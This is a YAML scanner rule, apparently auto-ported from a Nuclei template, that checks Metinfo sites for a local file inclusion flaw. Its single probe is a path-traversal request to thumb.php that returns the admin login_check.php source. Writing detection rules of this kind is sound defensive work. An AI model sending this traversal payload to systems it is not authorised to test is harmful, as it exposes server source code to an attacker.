schema_version: 1
id: "cortex.community:cnvd-2018-13393"
rule_version: "1.0.0"
requires:
  engine_api: 1
  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
info:
  name: "Metinfo - Local File Inclusion"
  description: "Metinfo is susceptible to local file inclusion. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
  references:
    - "https://paper.seebug.org/676/"
  cwes: [22]
  tags: ["cnvd2018", "cnvd", "metinfo", "cvnd2018", "lfi", "vuln", "nuclei", "auto-ported", "signal"]
  remediation: "See the referenced advisory / template source for remediation."
finding:
  sink_type: "VULNERABLE_COMPONENT"
  impact: "INFORMATION_DISCLOSURE"
  severity: "High"
  root_cause: "nuclei-ported-signal"
execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
steps:
  - id: "probe0"
    request: { method: "GET", path: "/include/thumb.php?dir=http\\..\\admin\\login\\login_check.php" }
proof:
  kind: "signal.v1"
  assertions:
    all:
      - contains: { left: { ref: "steps.probe0.body" }, right: { value: "<?php" } }
      - contains: { left: { ref: "steps.probe0.body" }, right: { value: "login_met_cookie($metinfo_admin_name);" } }
